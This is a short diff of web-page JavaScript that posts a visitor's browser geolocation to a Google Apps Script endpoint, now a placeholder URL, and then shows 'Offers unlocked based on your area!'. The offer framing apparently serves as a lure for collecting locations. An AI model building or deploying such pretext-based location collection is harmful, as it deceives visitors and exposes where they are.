@@ -114,18 +114,22 @@
         accuracy: position.coords.accuracy
       };
 
-      fetch("https://script.google.com/macros/s/AKfycbyjHNhIq25OJbvkXveq0cAFW4Z2_OGI86ni3KlL-Tu8fwj-7mId9r1shEOgtkD2EctR/exec", {
-        method: "POST",
-        body: JSON.stringify(data),
-        headers: {
-          "Content-Type": "application/json"
-        }
-      }).then(() => {
-        alert("✅ Offers unlocked based on your area!");
-        document.getElementById("locationModal").style.display = "none";
-      }).catch(() => {
-        alert("Failed to send location.");
-      });
+     fetch("YOUR_WEB_APP_URL", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify(data),
+  mode: "no-cors"
+})
+.then(() => {
+  alert("✅ Offers unlocked based on your area!");
+  document.getElementById("locationModal").style.display = "none";
+})
+.catch(() => {
+  alert("Failed to send location.");
+});
+
 
     }, function() {
       alert('❌ Permission denied or error.');
